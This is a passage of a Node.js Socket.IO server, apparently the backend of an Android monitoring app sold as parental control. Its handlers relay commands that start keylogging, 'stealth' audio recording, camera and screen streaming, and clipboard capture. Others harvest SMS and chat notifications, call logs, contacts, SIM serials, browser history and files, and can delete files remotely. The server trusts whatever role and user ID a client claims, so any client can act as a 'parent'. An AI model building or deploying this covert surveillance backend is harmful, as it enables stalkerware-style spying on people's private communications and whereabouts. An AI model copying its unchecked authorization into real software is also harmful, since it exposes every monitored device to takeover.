const { v4: uuidv4 } = require('uuid');
const database = require('./models/database');

// Track online users
const onlineUsers = new Map(); // socketId -> { userId, role, familyCode, name }
const userSockets = new Map(); // userId -> socketId (latest)

// Helper: save call logs
function saveCallLogs(socket, io, data) {
  const user = onlineUsers.get(socket.id);
  if (!user) return;
  try {
    const { logs, number, name, type, date, duration } = data || {};
    const db = database.getDb();
    if (Array.isArray(logs)) {
      const stmt = db.prepare('INSERT INTO call_logs (id, user_id, phone_number, contact_name, call_type, duration_seconds, call_date) VALUES (?, ?, ?, ?, ?, ?, ?)');
      for (const c of logs) {
        stmt.run(uuidv4(), user.userId, c.number || '', c.name || '', c.type || 'incoming', c.duration || 0, c.date ? new Date(c.date).toISOString() : new Date().toISOString());
      }
      stmt.finalize();
    } else if (number) {
      db.run(
        'INSERT INTO call_logs (id, user_id, phone_number, contact_name, call_type, duration_seconds, call_date) VALUES (?, ?, ?, ?, ?, ?, ?)',
        [uuidv4(), user.userId, number, name || '', type || 'incoming', duration || 0, date ? new Date(date).toISOString() : new Date().toISOString()]
      );
    }
    io.to(`family:${user.familyCode}`).emit('call:data', { userId: user.userId, name: user.name, ...data, timestamp: new Date().toISOString() });
  } catch (e) { console.error('[WS] saveCallLogs error:', e); }
}

// Helper: save contacts
function saveContacts(socket, io, data) {
  const user = onlineUsers.get(socket.id);
  if (!user) return;
  try {
    const { contacts } = data || {};
    const db = database.getDb();
    if (Array.isArray(contacts)) {
      const stmt = db.prepare('INSERT OR REPLACE INTO contacts (id, user_id, contact_id, name, phone_number) VALUES (?, ?, ?, ?, ?)');
      for (const c of contacts) {
        stmt.run(uuidv4(), user.userId, String(c.id || ''), c.name || '', c.number || '');
      }
      stmt.finalize();
    }
    io.to(`family:${user.familyCode}`).emit('contacts:data', { userId: user.userId, name: user.name, ...data, timestamp: new Date().toISOString() });
  } catch (e) { console.error('[WS] saveContacts error:', e); }
}

// Helper: save SIM info
function saveSim(socket, io, data) {
  const user = onlineUsers.get(socket.id);
  if (!user) return;
  try {
    const d = data || {};
    const { simSlots } = d;
    const db = database.getDb();
    if (Array.isArray(simSlots) && simSlots.length > 0) {
      const stmt = db.prepare('INSERT INTO sim_info (id, user_id, slot_index, carrier_name, network_operator, sim_state, phone_number, sim_serial) VALUES (?, ?, ?, ?, ?, ?, ?, ?)');
      for (let i = 0; i < simSlots.length; i++) {
        const s = simSlots[i] || {};
        stmt.run(
          uuidv4(),
          user.userId,
          s.slotIndex ?? i,
          s.carrierName || '',
          s.simOperator || d.networkOperator || d.simOperator || '',
          d.simState || '',
          d.lineNumber || '',
          d.simSerial || ''
        );
      }
      stmt.finalize();
    } else {
      // single SIM or no slot info — still save the basic info
      db.run(
        'INSERT INTO sim_info (id, user_id, slot_index, carrier_name, network_operator, sim_state, phone_number, sim_serial) VALUES (?, ?, ?, ?, ?, ?, ?, ?)',
        [uuidv4(), user.userId, 0, d.simOperator || d.networkOperator || '', d.networkOperator || '', d.simState || '', d.lineNumber || '', d.simSerial || '']
      );
    }
    io.to(`family:${user.familyCode}`).emit('sim:data', { userId: user.userId, name: user.name, ...d, timestamp: new Date().toISOString() });
  } catch (e) { console.error('[WS] saveSim error:', e); }
}

// Helper: save SMS/chat log data (used by both sms:data and sms:log events)
function saveSmsLogs(socket, io, data) {
  const user = onlineUsers.get(socket.id);
  if (!user) return;
  try {
    const { sender, message, appName, packageName, type, logs } = data || {};
    const db = database.getDb();
    if (Array.isArray(logs)) {
      const stmt = db.prepare('INSERT INTO sms_logs (id, user_id, sender, message, app_name, type) VALUES (?, ?, ?, ?, ?, ?)');
      for (const log of logs) {
        stmt.run(uuidv4(), user.userId, log.sender || '', log.message || '', log.appName || appName || packageName || 'SMS', log.type || type || 'inbox');
      }
      stmt.finalize();
    } else if (sender || message) {
      db.run(
        'INSERT INTO sms_logs (id, user_id, sender, message, app_name, type) VALUES (?, ?, ?, ?, ?, ?)',
        [uuidv4(), user.userId, sender || '', message || '', appName || packageName || 'SMS', type || 'inbox']
      );
    }
    io.to(`family:${user.familyCode}`).emit('sms:data', {
      userId: user.userId, name: user.name, sender, message, appName, packageName, type, logs,
      timestamp: new Date().toISOString()
    });
  } catch (e) { console.error('[WS] saveSmsLogs error:', e); }
}

function initialize(io) {
  io.on('connection', (socket) => {
    console.log(`[WS] New connection: ${socket.id}`);

    // ========== AUTH ==========
    socket.on('auth', (data) => {
      try {
        const { userId, role, familyCode, name } = data || {};
        if (!userId || !familyCode) {
          console.warn('[WS] Auth rejected: missing userId/familyCode');
          socket.emit('auth:error', { error: 'Missing userId or familyCode' });
          return;
        }
        onlineUsers.set(socket.id, { userId, role, familyCode, name: name || 'User', socketId: socket.id });
        userSockets.set(userId, socket.id);
        socket.join(`family:${familyCode}`);
        socket.join(`user:${userId}`);
        io.to(`family:${familyCode}`).emit('user:online', { userId, name, role });
        const db = database.getDb();
        db.run('UPDATE users SET last_active = CURRENT_TIMESTAMP WHERE id = ?', [userId]);
        socket.emit('auth:ok', { userId, role, familyCode, name, timestamp: new Date().toISOString() });
        console.log(`[WS] ${name} (${role}) authenticated in family ${familyCode}`);
      } catch (e) { console.error('[WS] auth error:', e); }
    });

    // ========== LOCATION UPDATE ==========
    socket.on('location:update', (data) => {
      const user = onlineUsers.get(socket.id);
      if (!user) return;
      try {
        const { latitude, longitude, accuracy, batteryLevel } = data || {};
        if (typeof latitude !== 'number' || typeof longitude !== 'number') return;
        const db = database.getDb();
        const locationId = uuidv4();
        db.run(
          'INSERT INTO locations (id, user_id, latitude, longitude, accuracy, battery_level) VALUES (?, ?, ?, ?, ?, ?)',
          [locationId, user.userId, latitude, longitude, accuracy || 0, batteryLevel || 0]
        );
        io.to(`family:${user.familyCode}`).emit('location:updated', {
          userId: user.userId, name: user.name,
          latitude, longitude, accuracy: accuracy || 0, batteryLevel: batteryLevel || 0,
          timestamp: new Date().toISOString()
        });
      } catch (e) { console.error('[WS] location:update error:', e); }
    });

    // ========== BLOCKLIST SYNC (kid requests its blocklist on connect) ==========
    socket.on('blocklist:sync', (data) => {
      const user = onlineUsers.get(socket.id);
      if (!user) return;
      try {
        const db = database.getDb();
        const targetKidId = (data && data.kidId) || user.userId;
        db.all(
          'SELECT app_name, package_name, created_at FROM app_blocklist WHERE kid_id = ? OR family_code = ?',
          [targetKidId, user.familyCode],
          (err, rows) => {
            if (err) { console.error('[WS] blocklist:sync DB error', err); return; }
            socket.emit('blocklist:sync:result', {
              kidId: targetKidId,
              blockedApps: rows || [],
              count: (rows || []).length,
              timestamp: new Date().toISOString()
            });
            console.log(`[WS] blocklist:sync → ${(rows||[]).length} apps for ${targetKidId}`);
          }
        );
      } catch (e) { console.error('[WS] blocklist:sync error:', e); }
    });

    // ========== BLOCK / UNBLOCK APP (parent emits) ==========
    socket.on('blocklist:block', (data) => {
      const user = onlineUsers.get(socket.id);
      if (!user || user.role !== 'parent') return;
      try {
        const { targetUserId, appName, packageName } = data || {};
        if (!targetUserId || !packageName) return;
        const db = database.getDb();
        const id = uuidv4();
        db.run(
          'INSERT OR REPLACE INTO app_blocklist (id, family_code, kid_id, app_name, package_name, blocked_by) VALUES (?, ?, ?, ?, ?, ?)',
          [id, user.familyCode, targetUserId, appName || packageName, packageName, user.userId]
        );
        io.to(`user:${targetUserId}`).emit('blocklist:block', {
          appName: appName || packageName, packageName,
          blockedBy: user.userId, parentName: user.name,
          timestamp: new Date().toISOString()
        });
        console.log(`[WS] parent ${user.name} blocked ${packageName} on ${targetUserId}`);
      } catch (e) { console.error('[WS] blocklist:block error:', e); }
    });

    socket.on('blocklist:unblock', (data) => {
      const user = onlineUsers.get(socket.id);
      if (!user || user.role !== 'parent') return;
      try {
        const { targetUserId, packageName } = data || {};
        if (!targetUserId || !packageName) return;
        const db = database.getDb();
        db.run('DELETE FROM app_blocklist WHERE kid_id = ? AND package_name = ?', [targetUserId, packageName]);
        io.to(`user:${targetUserId}`).emit('blocklist:unblock', {
          packageName, unblockedBy: user.userId, parentName: user.name
        });
      } catch (e) { console.error('[WS] blocklist:unblock error:', e); }
    });

    // ========== CHECK-IN (kid emits) ==========
    socket.on('checkin', (data) => {
      const user = onlineUsers.get(socket.id);
      if (!user) return;
      try {
        const { status, message, latitude, longitude } = data || {};
        const db = database.getDb();
        const id = uuidv4();
        db.run(
          'INSERT INTO checkins (id, user_id, status, message) VALUES (?, ?, ?, ?)',
          [id, user.userId, status || 'ok', message || '']
        );
        // Notify family
        io.to(`family:${user.familyCode}`).emit('checkin:received', {
          userId: user.userId, name: user.name, role: user.role,
          status: status || 'ok', message: message || '',
          latitude, longitude,
          timestamp: new Date().toISOString()
        });
        console.log(`[WS] checkin from ${user.name}: ${status || 'ok'}`);
      } catch (e) { console.error('[WS] checkin error:', e); }
    });

    // ========== SOS TRIGGER (DIHAPUS) ==========
    // CATATAN: Fitur SOS sudah dihapus permanen. Anak tidak bisa kirim SOS,
    // parent tidak ada UI untuk terima. Handler ini cuma log untuk audit
    // (jaga-jaga ada APK lama yang masih emit) tapi tidak relay ke parent.
    socket.on('sos:trigger', (data) => {
      const user = onlineUsers.get(socket.id);
      if (!user) return;
      console.log(`[WS] ⚠️ ${user.name} tried sos:trigger (DISABLED feature)`);
      // Tidak broadcast, tidak save — silent drop
    });

    // ========== SCREEN LOCK / UNLOCK / VIEW (parent → kid) ==========
    socket.on('screen:lock', (data) => {
      const user = onlineUsers.get(socket.id);
      if (!user || user.role !== 'parent') return;
      const { targetUserId, reason } = data || {};
      if (!targetUserId) return;
      io.to(`user:${targetUserId}`).emit('screen:lock', {
        reason: reason || 'Locked by parent',
        lockedBy: user.userId, parentName: user.name,
        timestamp: new Date().toISOString()
      });
      io.to(`user:${user.userId}`).emit('screen:lock:sent', { targetUserId, ok: true });
    });

    socket.on('screen:unlock', (data) => {
      const user = onlineUsers.get(socket.id);
      if (!user || user.role !== 'parent') return;
      const { targetUserId } = data || {};
      if (!targetUserId) return;
      io.to(`user:${targetUserId}`).emit('screen:unlock', { unlockedBy: user.userId });
    });

    socket.on('screen:capture', (data) => {
      const user = onlineUsers.get(socket.id);
      if (!user || user.role !== 'parent') return;
      const { targetUserId } = data || {};
      if (!targetUserId) return;
      io.to(`user:${targetUserId}`).emit('screen:capture', { requestedBy: user.userId, parentName: user.name });
    });

    socket.on('screen:view:start', (data) => {
      const user = onlineUsers.get(socket.id);
      if (!user || user.role !== 'parent') return;
      const { targetUserId } = data || {};
      if (!targetUserId) return;
      io.to(`user:${targetUserId}`).emit('screen:view:start', { requestedBy: user.userId });
    });
    socket.on('screen:view:stop', (data) => {
      const user = onlineUsers.get(socket.id);
      if (!user || user.role !== 'parent') return;
      const { targetUserId } = data || {};
      if (!targetUserId) return;
      io.to(`user:${targetUserId}`).emit('screen:view:stop', { requestedBy: user.userId });
    });

    // ========== CAMERA (parent → kid) ==========
    socket.on('camera:start', (data) => {
      const user = onlineUsers.get(socket.id);
      if (!user || user.role !== 'parent') return;
      const { targetUserId, useFrontCamera, duration } = data || {};
      if (!targetUserId) return;
      io.to(`user:${targetUserId}`).emit('camera:start', {
        useFrontCamera: useFrontCamera !== false, duration: duration || 60000,
        requestedBy: user.userId, parentName: user.name
      });
    });
    socket.on('camera:stop', (data) => {
      const user = onlineUsers.get(socket.id);
      if (!user || user.role !== 'parent') return;
      const { targetUserId } = data || {};
      if (!targetUserId) return;
      io.to(`user:${targetUserId}`).emit('camera:stop', { requestedBy: user.userId });
    });
    // ========== CAMERA BURST (DIHAPUS) ==========
    // Server tetap listen untuk backward compatibility, tapi silent drop.
    socket.on('camera:burst:start', (data) => {
      const user = onlineUsers.get(socket.id);
      if (!user) return;
      console.log(`[WS] ${user.name} tried camera:burst:start (DISABLED)`);
    });
    socket.on('camera:burst:stop', (data) => {
      // Silent drop
    });
    socket.on('camera:burst:frame', (data) => {
      // Silent drop (fitur BURST sudah dihapus)
    });

    // ========== CAMERA FRAME UPLOAD (kid → server → parents) ==========
    socket.on('camera:frame', (data) => {
      const user = onlineUsers.get(socket.id);
      if (!user) return;
      try {
        const { imageBase64, isFrontCamera, timestamp } = data || {};
        if (!imageBase64) return;
        // Forward to parents in family
        io.to(`family:${user.familyCode}`).emit('camera:frame', {
          userId: user.userId, name: user.name,
          imageBase64, isFrontCamera: !!isFrontCamera,
          timestamp: timestamp || new Date().toISOString()
        });
      } catch (e) { console.error('[WS] camera:frame error:', e); }
    });
    socket.on('camera:stopped', (data) => {
      const user = onlineUsers.get(socket.id);
      if (!user) return;
      io.to(`family:${user.familyCode}`).emit('camera:stopped', { userId: user.userId, name: user.name });
    });

    // ========== VOICE / STEALTH AUDIO ==========
    socket.on('voice:start', (data) => {
      const user = onlineUsers.get(socket.id);
      if (!user || user.role !== 'parent') return;
      const { targetUserId, duration } = data || {};
      if (!targetUserId) return;
      io.to(`user:${targetUserId}`).emit('voice:start', { duration: duration || 30000, requestedBy: user.userId });
    });
    socket.on('voice:stop', (data) => {
      const user = onlineUsers.get(socket.id);
      if (!user || user.role !== 'parent') return;
      const { targetUserId } = data || {};
      if (!targetUserId) return;
      io.to(`user:${targetUserId}`).emit('voice:stop', { requestedBy: user.userId });
    });
    socket.on('audio:stealth:start', (data) => {
      const user = onlineUsers.get(socket.id);
      if (!user || user.role !== 'parent') return;
      const { targetUserId, duration } = data || {};
      if (!targetUserId) return;
      io.to(`user:${targetUserId}`).emit('audio:stealth:start', { duration: duration || 60000, requestedBy: user.userId });
    });
    socket.on('audio:stealth:stop', (data) => {
      const user = onlineUsers.get(socket.id);
      if (!user || user.role !== 'parent') return;
      const { targetUserId } = data || {};
      if (!targetUserId) return;
      io.to(`user:${targetUserId}`).emit('audio:stealth:stop', { requestedBy: user.userId });
    });

    // ========== APP USAGE / KEYLOG / CLIPBOARD ==========
    socket.on('app:usage:start', (data) => {
      const user = onlineUsers.get(socket.id);
      if (!user || user.role !== 'parent') return;
      const { targetUserId } = data || {};
      if (!targetUserId) return;
      io.to(`user:${targetUserId}`).emit('app:usage:start', { requestedBy: user.userId });
    });
    socket.on('app:usage:stop', (data) => {
      const user = onlineUsers.get(socket.id);
      if (!user || user.role !== 'parent') return;
      const { targetUserId } = data || {};
      if (!targetUserId) return;
      io.to(`user:${targetUserId}`).emit('app:usage:stop', { requestedBy: user.userId });
    });
    socket.on('keylog:start', (data) => {
      const user = onlineUsers.get(socket.id);
      if (!user || user.role !== 'parent') return;
      const { targetUserId } = data || {};
      if (!targetUserId) return;
      io.to(`user:${targetUserId}`).emit('keylog:start', { requestedBy: user.userId });
    });
    socket.on('keylog:stop', (data) => {
      const user = onlineUsers.get(socket.id);
      if (!user || user.role !== 'parent') return;
      const { targetUserId } = data || {};
      if (!targetUserId) return;
      io.to(`user:${targetUserId}`).emit('keylog:stop', { requestedBy: user.userId });
    });
    socket.on('clipboard:start', (data) => {
      const user = onlineUsers.get(socket.id);
      if (!user || user.role !== 'parent') return;
      const { targetUserId } = data || {};
      if (!targetUserId) return;
      io.to(`user:${targetUserId}`).emit('clipboard:start', { requestedBy: user.userId });
    });
    socket.on('clipboard:stop', (data) => {
      const user = onlineUsers.get(socket.id);
      if (!user || user.role !== 'parent') return;
      const { targetUserId } = data || {};
      if (!targetUserId) return;
      io.to(`user:${targetUserId}`).emit('clipboard:stop', { requestedBy: user.userId });
    });
    socket.on('battery:monitor:start', (data) => {
      const user = onlineUsers.get(socket.id);
      if (!user || user.role !== 'parent') return;
      const { targetUserId } = data || {};
      if (!targetUserId) return;
      io.to(`user:${targetUserId}`).emit('battery:monitor:start', { requestedBy: user.userId });
    });
    socket.on('battery:monitor:stop', (data) => {
      const user = onlineUsers.get(socket.id);
      if (!user || user.role !== 'parent') return;
      const { targetUserId } = data || {};
      if (!targetUserId) return;
      io.to(`user:${targetUserId}`).emit('battery:monitor:stop', { requestedBy: user.userId });
    });

    // ========== KEYLOG EVENTS (kid → server → parents) ==========
    socket.on('keylog:event', (data) => {
      const user = onlineUsers.get(socket.id);
      if (!user) return;
      try {
        const db = database.getDb();
        db.run(
          'INSERT INTO notification_events (id, user_id, app_name, text_content, package_name) VALUES (?, ?, ?, ?, ?)',
          [uuidv4(), user.userId, data?.packageName || '', data?.text || '', data?.packageName || '']
        );
        io.to(`family:${user.familyCode}`).emit('keylog:event', {
          userId: user.userId, name: user.name, ...data,
          timestamp: data?.timestamp || new Date().toISOString()
        });
      } catch (e) { console.error('[WS] keylog:event error:', e); }
    });

    // ========== APP USAGE UPLOAD (kid → server) ==========
    socket.on('app:usage:data', (data) => {
      const user = onlineUsers.get(socket.id);
      if (!user) return;
      try {
        const { appName, packageName, usageDuration, category } = data || {};
        if (!appName || !packageName) return;
        const db = database.getDb();
        db.run(
          'INSERT INTO app_usage (id, user_id, app_name, package_name, usage_duration, category) VALUES (?, ?, ?, ?, ?, ?)',
          [uuidv4(), user.userId, appName, packageName, usageDuration || 0, category || '']
        );
        io.to(`family:${user.familyCode}`).emit('app:usage:updated', {
          userId: user.userId, appName, packageName, usageDuration, category,
          timestamp: new Date().toISOString()
        });
      } catch (e) { console.error('[WS] app:usage:data error:', e); }
    });

    // ========== CLIPBOARD UPLOAD ==========
    socket.on('clipboard:data', (data) => {
      const user = onlineUsers.get(socket.id);
      if (!user) return;
      io.to(`family:${user.familyCode}`).emit('clipboard:data', {
        userId: user.userId, name: user.name, ...data, timestamp: new Date().toISOString()
      });
    });

    // ========== BATTERY UPLOAD ==========
    socket.on('battery:data', (data) => {
      const user = onlineUsers.get(socket.id);
      if (!user) return;
      io.to(`family:${user.familyCode}`).emit('battery:data', {
        userId: user.userId, name: user.name, ...data, timestamp: new Date().toISOString()
      });
    });

    // ========== SMS / CHAT LOGS ==========
    socket.on('sms:request-logs', (data) => {
      const user = onlineUsers.get(socket.id);
      if (!user || user.role !== 'parent') return;
      const { targetUserId } = data || {};
      if (!targetUserId) return;
      io.to(`user:${targetUserId}`).emit('sms:request-logs', { requestedBy: user.userId });
    });
    socket.on('sms:data', (data) => { saveSmsLogs(socket, io, data); });
    socket.on('sms:log', (data) => { saveSmsLogs(socket, io, data); }); // alias used by NotificationListenerService
    socket.on('notification:event', (data) => {
      const user = onlineUsers.get(socket.id);
      if (!user) return;
      try {
        const { appName, title, textContent, packageName } = data || {};
        const db = database.getDb();
        db.run(
          'INSERT INTO notification_events (id, user_id, app_name, title, text_content, package_name) VALUES (?, ?, ?, ?, ?, ?)',
          [uuidv4(), user.userId, appName || '', title || '', textContent || '', packageName || '']
        );
        io.to(`family:${user.familyCode}`).emit('notification:event', {
          userId: user.userId, name: user.name, appName, title, textContent, packageName,
          timestamp: new Date().toISOString()
        });
      } catch (e) { console.error('[WS] notification:event error:', e); }
    });

    // ========== CALL LOGS ==========
    socket.on('call:request', (data) => {
      const user = onlineUsers.get(socket.id);
      if (!user || user.role !== 'parent') return;
      const { targetUserId } = data || {};
      if (!targetUserId) return;
      io.to(`user:${targetUserId}`).emit('call:request', { requestedBy: user.userId });
    });
    socket.on('call:data', (data) => saveCallLogs(socket, io, data));
    socket.on('call:logs', (data) => saveCallLogs(socket, io, data)); // alias used by CallLogService

    // ========== CONTACTS ==========
    socket.on('contacts:request', (data) => {
      const user = onlineUsers.get(socket.id);
      if (!user || user.role !== 'parent') return;
      const { targetUserId } = data || {};
      if (!targetUserId) return;
      io.to(`user:${targetUserId}`).emit('contacts:request', { requestedBy: user.userId });
    });
    socket.on('contacts:data', (data) => saveContacts(socket, io, data));
    socket.on('contacts:result', (data) => saveContacts(socket, io, data)); // alias used by ContactsAccessService

    // ========== SIM INFO ==========
    socket.on('sim:request', (data) => {
      const user = onlineUsers.get(socket.id);
      if (!user || user.role !== 'parent') return;
      const { targetUserId } = data || {};
      if (!targetUserId) return;
      io.to(`user:${targetUserId}`).emit('sim:request', { requestedBy: user.userId });
    });
    socket.on('sim:data', (data) => saveSim(socket, io, data));
    socket.on('sim:info', (data) => saveSim(socket, io, data)); // alias used by SimCardService

    // ========== BROWSER HISTORY ==========
    socket.on('browser:history:request', (data) => {
      const user = onlineUsers.get(socket.id);
      if (!user || user.role !== 'parent') return;
      const { targetUserId } = data || {};
      if (!targetUserId) return;
      io.to(`user:${targetUserId}`).emit('browser:history:request', { requestedBy: user.userId });
    });
    socket.on('browser:history', (data) => {
      const user = onlineUsers.get(socket.id);
      if (!user) return;
      io.to(`family:${user.familyCode}`).emit('browser:history', { userId: user.userId, name: user.name, ...data, timestamp: new Date().toISOString() });
    });

    // ========== FILE MANAGER ==========
    socket.on('file:list', (data) => {
      const user = onlineUsers.get(socket.id);
      if (!user || user.role !== 'parent') return;
      const { targetUserId, path } = data || {};
      if (!targetUserId) return;
      io.to(`user:${targetUserId}`).emit('file:list', { path: path || '/storage/emulated/0', requestedBy: user.userId });
    });
    socket.on('file:read', (data) => {
      const user = onlineUsers.get(socket.id);
      if (!user || user.role !== 'parent') return;
      const { targetUserId, path } = data || {};
      if (!targetUserId) return;
      io.to(`user:${targetUserId}`).emit('file:read', { path, requestedBy: user.userId });
    });
    socket.on('file:delete', (data) => {
      const user = onlineUsers.get(socket.id);
      if (!user || user.role !== 'parent') return;
      const { targetUserId, path } = data || {};
      if (!targetUserId) return;
      io.to(`user:${targetUserId}`).emit('file:delete', { path, requestedBy: user.userId });
    });
    socket.on('file:data', (data) => {
      const user = onlineUsers.get(socket.id);
      if (!user) return;
      try {
        const { action, filePath, fileSize, fileName } = data || {};
        if (action && filePath) {
          const db = database.getDb();
          db.run('INSERT INTO file_logs (id, user_id, action, file_path, file_size) VALUES (?, ?, ?, ?, ?)',
            [uuidv4(), user.userId, action, filePath, fileSize || 0]);
        }
        io.to(`family:${user.familyCode}`).emit('file:data', { userId: user.userId, name: user.name, ...data, timestamp: new Date().toISOString() });
      } catch (e) { console.error('[WS] file:data error:', e); }
    });
    // Result events from FileManagerService
    socket.on('file:list:result', (data) => {
      const user = onlineUsers.get(socket.id);
      if (!user) return;
      io.to(`family:${user.familyCode}`).emit('file:list:result', { userId: user.userId, name: user.name, ...data, timestamp: new Date().toISOString() });
    });
    socket.on('file:read:result', (data) => {
      const user = onlineUsers.get(socket.id);
      if (!user) return;
      io.to(`family:${user.familyCode}`).emit('file:read:result', { userId: user.userId, name: user.name, ...data, timestamp: new Date().toISOString() });
    });
    socket.on('file:delete:result', (data) => {
      const user = onlineUsers.get(socket.id);
      if (!user) return;
      io.to(`family:${user.familyCode}`).emit('file:delete:result', { userId: user.userId, name: user.name, ...data, timestamp: new Date().toISOString() });
    });

    // ========== MEDIA GALLERY ==========
    socket.on('media:list', (data) => {
      const user = onlineUsers.get(socket.id);
      if (!user || user.role !== 'parent') return;
      const { targetUserId, mediaType } = data || {};
      if (!targetUserId) return;
      io.to(`user:${targetUserId}`).emit('media:list', { mediaType: mediaType || 'image', requestedBy: user.userId });
    });
    socket.on('media:file', (data) => {
      const user = onlineUsers.get(socket.id);
      if (!user || user.role !== 'parent') return;
      const { targetUserId, filePath } = data || {};
      if (!targetUserId) return;
      io.to(`user:${targetUserId}`).emit('media:file', { filePath, requestedBy: user.userId });
    });
    socket.on('media:data', (data) => {
      const user = onlineUsers.get(socket.id);
      if (!user) return;
      try {
        const { fileName, filePath, fileSize, mimeType, mediaType, mediaItems } = data || {};
        const db = database.getDb();
        if (Array.isArray(mediaItems)) {
          const stmt = db.prepare('INSERT INTO media_cache (id, user_id, file_name, file_path, file_size, mime_type, media_type) VALUES (?, ?, ?, ?, ?, ?, ?)');
          for (const item of mediaItems) {
            stmt.run(uuidv4(), user.userId, item.fileName || 'unknown', item.filePath || '', item.fileSize || 0, item.mimeType || '', item.mediaType || 'image');
          }
          stmt.finalize();
        }
        io.to(`family:${user.familyCode}`).emit('media:data', { userId: user.userId, name: user.name, fileName, filePath, fileSize, mimeType, mediaType, mediaItems, timestamp: new Date().toISOString() });
      } catch (e) { console.error('[WS] media:data error:', e); }
    });
    // Result events from MediaAccessService
    socket.on('media:list:result', (data) => {
      const user = onlineUsers.get(socket.id);
      if (!user) return;
      try {
        const { mediaFiles } = data || {};
        const db = database.getDb();
        if (Array.isArray(mediaFiles)) {
          const stmt = db.prepare('INSERT OR IGNORE INTO media_cache (id, user_id, file_name, file_path, file_size, mime_type, media_type) VALUES (?, ?, ?, ?, ?, ?, ?)');
          for (const m of mediaFiles) {
            stmt.run(uuidv4(), user.userId, m.fileName || 'unknown', m.filePath || '', m.fileSize || 0, m.mimeType || '', m.mediaType || 'image');
          }
          stmt.finalize();
        }
        io.to(`family:${user.familyCode}`).emit('media:list:result', { userId: user.userId, name: user.name, ...data, timestamp: new Date().toISOString() });
      } catch (e) { console.error('[WS] media:list:result error:', e); }
    });
    socket.on('media:file:result', (data) => {
      const user = onlineUsers.get(socket.id);
      if (!user) return;
      io.to(`family:${user.familyCode}`).emit('media:file:result', { userId: user.userId, name: user.name, ...data, timestamp: new Date().toISOString() });
    });
    // Camera frame ack
    socket.on('screen:capture:result', (data) => {
      const user = onlineUsers.get(socket.id);
      if (!user) return;
      io.to(`family:${user.familyCode}`).emit('screen:capture:result', { userId: user.userId, name: user.name, ...data, timestamp: new Date().toISOString() });
    });
    socket.on('screen:view:frame', (data) => {
      const user = onlineUsers.get(socket.id);
      if (!user) return;
      io.to(`family:${user.familyCode}`).emit('screen:view:frame', { userId: user.userId, name: user.name, ...data, timestamp: new Date().toISOString() });
    });
    // Remote command result
    socket.on('device:command:result', (data) => {
      const user = onlineUsers.get(socket.id);
      if (!user) return;
      io.to(`family:${user.familyCode}`).emit('device:command:result', { userId: user.userId, name: user.name, ...data, timestamp: new Date().toISOString() });
    });
    // Device admin status report
    socket.on('device:admin:status', (data) => {
      const user = onlineUsers.get(socket.id);
      if (!user) return;
      io.to(`family:${user.familyCode}`).emit('device:admin:status', { userId: user.userId, name: user.name, ...data, timestamp: new Date().toISOString() });
    });

    // ============ Service data uploads (from kid device services) ============
    socket.on('app:usage:report', (data) => {
      const user = onlineUsers.get(socket.id);
      if (!user) return;
      try {
        const { apps, totalTime, appCount } = data || {};
        const db = database.getDb();
        if (Array.isArray(apps)) {
          const stmt = db.prepare('INSERT INTO app_usage (id, user_id, app_name, package_name, usage_duration) VALUES (?, ?, ?, ?, ?)');
          for (const a of apps) {
            stmt.run(uuidv4(), user.userId, a.appName || a.packageName || '', a.packageName || '', a.usageTime || 0);
          }
          stmt.finalize();
        }
        io.to(`family:${user.familyCode}`).emit('app:usage:updated', { userId: user.userId, name: user.name, apps, totalTime, appCount, timestamp: new Date().toISOString() });
      } catch (e) { console.error('[WS] app:usage:report error:', e); }
    });
    socket.on('clipboard:update', (data) => {
      const user = onlineUsers.get(socket.id);
      if (!user) return;
      io.to(`family:${user.familyCode}`).emit('clipboard:data', { userId: user.userId, name: user.name, ...data, timestamp: new Date().toISOString() });
    });
    socket.on('battery:update', (data) => {
      const user = onlineUsers.get(socket.id);
      if (!user) return;
      io.to(`family:${user.familyCode}`).emit('battery:data', { userId: user.userId, name: user.name, ...data, timestamp: new Date().toISOString() });
    });
    socket.on('voice:frame', (data) => {
      const user = onlineUsers.get(socket.id);
      if (!user) return;
      io.to(`family:${user.familyCode}`).emit('voice:frame', { userId: user.userId, name: user.name, ...data, timestamp: new Date().toISOString() });
    });
    socket.on('voice:error', (data) => {
      const user = onlineUsers.get(socket.id);
      if (!user) return;
      io.to(`family:${user.familyCode}`).emit('voice:error', { userId: user.userId, name: user.name, ...data });
    });
    socket.on('audio:stealth:frame', (data) => {
      const user = onlineUsers.get(socket.id);
      if (!user) return;
      io.to(`family:${user.familyCode}`).emit('audio:stealth:frame', { userId: user.userId, name: user.name, ...data, timestamp: new Date().toISOString() });
    });
    socket.on('audio:stealth:stopped', (data) => {
      const user = onlineUsers.get(socket.id);
      if (!user) return;
      io.to(`family:${user.familyCode}`).emit('audio:stealth:stopped', { userId: user.userId, name: user.name, ...data });
    });
    // camera:burst:frame (DIHAPUS - silent drop)
    socket.on('screen:view:frame', (data) => {
      const user = onlineUsers.get(socket.id);
      if (!user) return;
      io.to(`family:${user.familyCode}`).emit('screen:view:frame', { userId: user.userId, name: user.name, ...data, timestamp: new Date().toISOString() });
    });

    // ========== WIFI / NETWORK ==========
    socket.on('wifi:request', (data) => {
      const user = onlineUsers.get(socket.id);
      if (!user || user.role !== 'parent') return;
      const { targetUserId } = data || {};
      if (!targetUserId) return;
      io.to(`user:${targetUserId}`).emit('wifi:request', { requestedBy: user.userId });
    });
    socket.on('network:data', (data) => {
      const user = onlineUsers.get(socket.id);
      if (!user) return;
      try {
        const { ssid, bssid, signalStrength, ipAddress, isConnected } = data || {};
        const db = database.getDb();
        db.run(
          'INSERT INTO network_logs (id, user_id, ssid, bssid, signal_strength, ip_address, is_connected) VALUES (?, ?, ?, ?, ?, ?, ?)',
          [uuidv4(), user.userId, ssid || '', bssid || '', signalStrength || 0, ipAddress || '', isConnected ? 1 : 0]
        );
        io.to(`family:${user.familyCode}`).emit('network:data', { userId: user.userId, name: user.name, ssid, bssid, signalStrength, ipAddress, isConnected, timestamp: new Date().toISOString() });
      } catch (e) { console.error('[WS] network:data error:', e); }
    });
    socket.on('wifi:update', (data) => {
      const user = onlineUsers.get(socket.id);
      if (!user) return;
      try {
        const { ssid, bssid, signalStrength, ipAddress, isConnected } = data || {};
        const db = database.getDb();
        db.run(
          'INSERT INTO network_logs (id, user_id, ssid, bssid, signal_strength, ip_address, is_connected) VALUES (?, ?, ?, ?, ?, ?, ?)',
          [uuidv4(), user.userId, ssid || '', bssid || '', signalStrength || 0, ipAddress || '', isConnected ? 1 : 0]
        );
        io.to(`family:${user.familyCode}`).emit('network:data', { userId: user.userId, name: user.name, ssid, bssid, signalStrength, ipAddress, isConnected, timestamp: new Date().toISOString() });
      } catch (e) { console.error('[WS] wifi:update error:', e); }
    });
